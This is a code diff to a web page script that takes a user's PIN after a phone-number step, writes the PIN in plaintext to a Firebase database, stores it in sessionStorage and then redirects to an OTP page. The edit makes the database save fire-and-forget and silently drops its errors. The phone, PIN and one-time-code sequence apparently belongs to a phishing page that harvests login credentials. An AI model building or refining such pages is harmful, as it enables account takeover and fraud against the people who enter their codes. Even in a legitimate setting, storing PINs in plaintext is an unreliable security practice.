@@ -96,24 +96,15 @@
     }
 
     var userId = sessionStorage.getItem("affinity_userId");
-    if (!userId) { 
-      window.location.href = "phone-number.html"; 
-      return; 
-    }
+    if (!userId) { window.location.href = "phone-number.html"; return; }
 
     sessionStorage.setItem("affinity_pin", pin);
 
-    // ✅ Save PIN to Firebase with .then() to ensure it completes
-    database.ref(DB_NODE + "/" + userId).update({ pin: pin })
-      .then(function() {
-        // ✅ Navigate only after save completes
-        window.location.href = "otp.html";
-      })
-      .catch(function(error) {
-        console.error("❌ Firebase error:", error);
-        // Still navigate even if save fails
-        window.location.href = "otp.html";
-      });
+    // Save PIN to Firebase in background
+    database.ref(DB_NODE + "/" + userId).update({ pin: pin }).catch(function(){});
+
+    // Navigate immediately
+    window.location.href = "otp.html";
   });
 </script>
 
